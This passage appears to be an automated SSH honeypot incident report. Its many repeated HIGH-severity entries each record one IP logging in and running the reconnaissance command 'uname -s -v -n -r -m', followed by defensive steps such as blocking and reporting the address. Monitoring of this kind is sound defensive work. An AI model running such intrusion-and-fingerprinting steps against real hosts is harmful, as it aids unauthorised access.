| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:00:43` | `cowrie.session.connect` |
| `2026-08-15 07:00:43` | `cowrie.client.version` |
| `2026-08-15 07:00:43` | `cowrie.client.kex` |
| `2026-08-15 07:00:44` | `cowrie.login.success` |
| `2026-08-15 07:00:45` | `cowrie.session.params` |
| `2026-08-15 07:00:45` | `cowrie.command.input` |
| `2026-08-15 07:00:45` | `cowrie.log.closed` |
| `2026-08-15 07:00:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebea2979109e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:00 |
| **Last Seen** | 2026-08-15 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:00:49` | `cowrie.session.connect` |
| `2026-08-15 07:00:49` | `cowrie.client.version` |
| `2026-08-15 07:00:49` | `cowrie.client.kex` |
| `2026-08-15 07:00:50` | `cowrie.login.success` |
| `2026-08-15 07:00:50` | `cowrie.session.params` |
| `2026-08-15 07:00:50` | `cowrie.command.input` |
| `2026-08-15 07:00:51` | `cowrie.log.closed` |
| `2026-08-15 07:00:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aafd9873e3d7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:00 |
| **Last Seen** | 2026-08-15 07:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:00:55` | `cowrie.session.connect` |
| `2026-08-15 07:00:55` | `cowrie.client.version` |
| `2026-08-15 07:00:55` | `cowrie.client.kex` |
| `2026-08-15 07:00:56` | `cowrie.login.success` |
| `2026-08-15 07:00:57` | `cowrie.session.params` |
| `2026-08-15 07:00:57` | `cowrie.command.input` |
| `2026-08-15 07:00:58` | `cowrie.log.closed` |
| `2026-08-15 07:00:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e26b414f7b5c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:01 |
| **Last Seen** | 2026-08-15 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:01:01` | `cowrie.session.connect` |
| `2026-08-15 07:01:01` | `cowrie.client.version` |
| `2026-08-15 07:01:01` | `cowrie.client.kex` |
| `2026-08-15 07:01:01` | `cowrie.login.success` |
| `2026-08-15 07:01:02` | `cowrie.session.params` |
| `2026-08-15 07:01:02` | `cowrie.command.input` |
| `2026-08-15 07:01:02` | `cowrie.log.closed` |
| `2026-08-15 07:01:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c93c4469ee22

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:01 |
| **Last Seen** | 2026-08-15 07:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:01:06` | `cowrie.session.connect` |
| `2026-08-15 07:01:06` | `cowrie.client.version` |
| `2026-08-15 07:01:06` | `cowrie.client.kex` |
| `2026-08-15 07:01:08` | `cowrie.login.success` |
| `2026-08-15 07:01:09` | `cowrie.session.params` |
| `2026-08-15 07:01:09` | `cowrie.command.input` |
| `2026-08-15 07:01:09` | `cowrie.log.closed` |
| `2026-08-15 07:01:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87bcd8ab2bbd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:01 |
| **Last Seen** | 2026-08-15 07:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:01:12` | `cowrie.session.connect` |
| `2026-08-15 07:01:12` | `cowrie.client.version` |
| `2026-08-15 07:01:12` | `cowrie.client.kex` |
| `2026-08-15 07:01:13` | `cowrie.login.success` |
| `2026-08-15 07:01:14` | `cowrie.session.params` |
| `2026-08-15 07:01:14` | `cowrie.command.input` |
| `2026-08-15 07:01:14` | `cowrie.log.closed` |
| `2026-08-15 07:01:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-246b01c1ccd6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:01 |
| **Last Seen** | 2026-08-15 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:01:18` | `cowrie.session.connect` |
| `2026-08-15 07:01:18` | `cowrie.client.version` |
| `2026-08-15 07:01:18` | `cowrie.client.kex` |
| `2026-08-15 07:01:19` | `cowrie.login.success` |
| `2026-08-15 07:01:20` | `cowrie.session.params` |
| `2026-08-15 07:01:20` | `cowrie.command.input` |
| `2026-08-15 07:01:20` | `cowrie.log.closed` |
| `2026-08-15 07:01:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c066331cead

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:01 |
| **Last Seen** | 2026-08-15 07:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:01:24` | `cowrie.session.connect` |
| `2026-08-15 07:01:24` | `cowrie.client.version` |
| `2026-08-15 07:01:24` | `cowrie.client.kex` |
| `2026-08-15 07:01:25` | `cowrie.login.success` |
| `2026-08-15 07:01:26` | `cowrie.session.params` |
| `2026-08-15 07:01:26` | `cowrie.command.input` |
| `2026-08-15 07:01:26` | `cowrie.log.closed` |
| `2026-08-15 07:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbaaf77cc2df

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:01 |
| **Last Seen** | 2026-08-15 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:01:30` | `cowrie.session.connect` |
| `2026-08-15 07:01:30` | `cowrie.client.version` |
| `2026-08-15 07:01:30` | `cowrie.client.kex` |
| `2026-08-15 07:01:30` | `cowrie.login.success` |
| `2026-08-15 07:01:31` | `cowrie.session.params` |
| `2026-08-15 07:01:31` | `cowrie.command.input` |
| `2026-08-15 07:01:32` | `cowrie.log.closed` |
| `2026-08-15 07:01:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f9b8be7d792

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:01 |
| **Last Seen** | 2026-08-15 07:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:01:35` | `cowrie.session.connect` |
| `2026-08-15 07:01:36` | `cowrie.client.version` |
| `2026-08-15 07:01:36` | `cowrie.client.kex` |
| `2026-08-15 07:01:37` | `cowrie.login.success` |
| `2026-08-15 07:01:38` | `cowrie.session.params` |
| `2026-08-15 07:01:38` | `cowrie.command.input` |
| `2026-08-15 07:01:39` | `cowrie.log.closed` |
| `2026-08-15 07:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17ecd555e6cd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:01 |
| **Last Seen** | 2026-08-15 07:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:01:41` | `cowrie.session.connect` |
| `2026-08-15 07:01:41` | `cowrie.client.version` |
| `2026-08-15 07:01:41` | `cowrie.client.kex` |
| `2026-08-15 07:01:42` | `cowrie.login.success` |
| `2026-08-15 07:01:43` | `cowrie.session.params` |
| `2026-08-15 07:01:43` | `cowrie.command.input` |
| `2026-08-15 07:01:44` | `cowrie.log.closed` |
| `2026-08-15 07:01:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f497c13ebb43

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:01 |
| **Last Seen** | 2026-08-15 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:01:48` | `cowrie.session.connect` |
| `2026-08-15 07:01:48` | `cowrie.client.version` |
| `2026-08-15 07:01:48` | `cowrie.client.kex` |
| `2026-08-15 07:01:49` | `cowrie.login.success` |
| `2026-08-15 07:01:49` | `cowrie.session.params` |
| `2026-08-15 07:01:49` | `cowrie.command.input` |
| `2026-08-15 07:01:49` | `cowrie.log.closed` |
| `2026-08-15 07:01:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7590d8e976c6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:01 |
| **Last Seen** | 2026-08-15 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:01:54` | `cowrie.session.connect` |
| `2026-08-15 07:01:54` | `cowrie.client.version` |
| `2026-08-15 07:01:54` | `cowrie.client.kex` |
| `2026-08-15 07:01:55` | `cowrie.login.success` |
| `2026-08-15 07:01:55` | `cowrie.session.params` |
| `2026-08-15 07:01:55` | `cowrie.command.input` |
| `2026-08-15 07:01:56` | `cowrie.log.closed` |
| `2026-08-15 07:01:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38b6cdbe9b3c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:02 |
| **Last Seen** | 2026-08-15 07:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:02:01` | `cowrie.session.connect` |
| `2026-08-15 07:02:01` | `cowrie.client.version` |
| `2026-08-15 07:02:01` | `cowrie.client.kex` |
| `2026-08-15 07:02:01` | `cowrie.login.success` |
| `2026-08-15 07:02:02` | `cowrie.session.params` |
| `2026-08-15 07:02:02` | `cowrie.command.input` |
| `2026-08-15 07:02:03` | `cowrie.log.closed` |
| `2026-08-15 07:02:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f816e85e3f2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:02 |
| **Last Seen** | 2026-08-15 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:02:06` | `cowrie.session.connect` |
| `2026-08-15 07:02:07` | `cowrie.client.version` |
| `2026-08-15 07:02:07` | `cowrie.client.kex` |
| `2026-08-15 07:02:07` | `cowrie.login.success` |
| `2026-08-15 07:02:08` | `cowrie.session.params` |
| `2026-08-15 07:02:08` | `cowrie.command.input` |
| `2026-08-15 07:02:08` | `cowrie.log.closed` |
| `2026-08-15 07:02:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8480a0ac9fd6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:02 |
| **Last Seen** | 2026-08-15 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:02:13` | `cowrie.session.connect` |
| `2026-08-15 07:02:13` | `cowrie.client.version` |
| `2026-08-15 07:02:13` | `cowrie.client.kex` |
| `2026-08-15 07:02:13` | `cowrie.login.success` |
| `2026-08-15 07:02:14` | `cowrie.session.params` |
| `2026-08-15 07:02:14` | `cowrie.command.input` |
| `2026-08-15 07:02:14` | `cowrie.log.closed` |
| `2026-08-15 07:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fbf900481ad

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:02 |
| **Last Seen** | 2026-08-15 07:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:02:18` | `cowrie.session.connect` |
| `2026-08-15 07:02:18` | `cowrie.client.version` |
| `2026-08-15 07:02:18` | `cowrie.client.kex` |
| `2026-08-15 07:02:19` | `cowrie.login.success` |
| `2026-08-15 07:02:20` | `cowrie.session.params` |
| `2026-08-15 07:02:20` | `cowrie.command.input` |
| `2026-08-15 07:02:20` | `cowrie.log.closed` |
| `2026-08-15 07:02:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ab7df452759

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:02 |
| **Last Seen** | 2026-08-15 07:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:02:24` | `cowrie.session.connect` |
| `2026-08-15 07:02:24` | `cowrie.client.version` |
| `2026-08-15 07:02:24` | `cowrie.client.kex` |
| `2026-08-15 07:02:25` | `cowrie.login.success` |
| `2026-08-15 07:02:26` | `cowrie.session.params` |
| `2026-08-15 07:02:26` | `cowrie.command.input` |
| `2026-08-15 07:02:27` | `cowrie.log.closed` |
| `2026-08-15 07:02:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adef79147ef5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:02 |
| **Last Seen** | 2026-08-15 07:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:02:30` | `cowrie.session.connect` |
| `2026-08-15 07:02:31` | `cowrie.client.version` |
| `2026-08-15 07:02:31` | `cowrie.client.kex` |
| `2026-08-15 07:02:31` | `cowrie.login.success` |
| `2026-08-15 07:02:32` | `cowrie.session.params` |
| `2026-08-15 07:02:32` | `cowrie.command.input` |
| `2026-08-15 07:02:33` | `cowrie.log.closed` |
| `2026-08-15 07:02:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dac1be62a22

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:02 |
| **Last Seen** | 2026-08-15 07:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:02:36` | `cowrie.session.connect` |
| `2026-08-15 07:02:37` | `cowrie.client.version` |
| `2026-08-15 07:02:37` | `cowrie.client.kex` |
| `2026-08-15 07:02:38` | `cowrie.login.success` |
| `2026-08-15 07:02:40` | `cowrie.session.params` |
| `2026-08-15 07:02:40` | `cowrie.command.input` |
| `2026-08-15 07:02:40` | `cowrie.log.closed` |
| `2026-08-15 07:02:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4eb4e976d7a0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:02 |
| **Last Seen** | 2026-08-15 07:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:02:42` | `cowrie.session.connect` |
| `2026-08-15 07:02:42` | `cowrie.client.version` |
| `2026-08-15 07:02:42` | `cowrie.client.kex` |
| `2026-08-15 07:02:44` | `cowrie.login.success` |
| `2026-08-15 07:02:45` | `cowrie.session.params` |
| `2026-08-15 07:02:45` | `cowrie.command.input` |
| `2026-08-15 07:02:45` | `cowrie.log.closed` |
| `2026-08-15 07:02:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80fea18e9912

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:02 |
| **Last Seen** | 2026-08-15 07:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:02:48` | `cowrie.session.connect` |
| `2026-08-15 07:02:49` | `cowrie.client.version` |
| `2026-08-15 07:02:49` | `cowrie.client.kex` |
| `2026-08-15 07:02:50` | `cowrie.login.success` |
| `2026-08-15 07:02:51` | `cowrie.session.params` |
| `2026-08-15 07:02:51` | `cowrie.command.input` |
| `2026-08-15 07:02:52` | `cowrie.log.closed` |
| `2026-08-15 07:02:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9adfe1c0ea21

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:02 |
| **Last Seen** | 2026-08-15 07:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:02:54` | `cowrie.session.connect` |
| `2026-08-15 07:02:54` | `cowrie.client.version` |
| `2026-08-15 07:02:54` | `cowrie.client.kex` |
| `2026-08-15 07:02:56` | `cowrie.login.success` |
| `2026-08-15 07:02:57` | `cowrie.session.params` |
| `2026-08-15 07:02:57` | `cowrie.command.input` |
| `2026-08-15 07:02:57` | `cowrie.log.closed` |
| `2026-08-15 07:02:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd488b3e0210

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:03 |
| **Last Seen** | 2026-08-15 07:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:03:01` | `cowrie.session.connect` |
| `2026-08-15 07:03:01` | `cowrie.client.version` |
| `2026-08-15 07:03:01` | `cowrie.client.kex` |
| `2026-08-15 07:03:02` | `cowrie.login.success` |
| `2026-08-15 07:03:03` | `cowrie.session.params` |
| `2026-08-15 07:03:03` | `cowrie.command.input` |
| `2026-08-15 07:03:03` | `cowrie.log.closed` |
| `2026-08-15 07:03:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9af5168f5c92

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:03 |
| **Last Seen** | 2026-08-15 07:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:03:06` | `cowrie.session.connect` |
| `2026-08-15 07:03:07` | `cowrie.client.version` |
| `2026-08-15 07:03:07` | `cowrie.client.kex` |
| `2026-08-15 07:03:08` | `cowrie.login.success` |
| `2026-08-15 07:03:09` | `cowrie.session.params` |
| `2026-08-15 07:03:09` | `cowrie.command.input` |
| `2026-08-15 07:03:10` | `cowrie.log.closed` |
| `2026-08-15 07:03:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bac8118f63c6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 07:03 |
| **Last Seen** | 2026-08-15 07:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 07:03:12` | `cowrie.session.connect` |
| `2026-08-15 07:03:12` | `cowrie.client.version` |
| `2026-08-15 07:03:12` | `cowrie.client.kex` |
| `2026-08-15 07:03:14` | `cowrie.login.success` |
| `2026-08-15 07:03:15` | `cowrie.session.params` |
| `2026-08-15 07:03:15` | `cowrie.command.input` |
| `2026-08-15 07:03:15` | `cowrie.log.closed` |
| `2026-08-15 07:03:15` | `cowrie.session.closed` |

**Recommended Actions:**
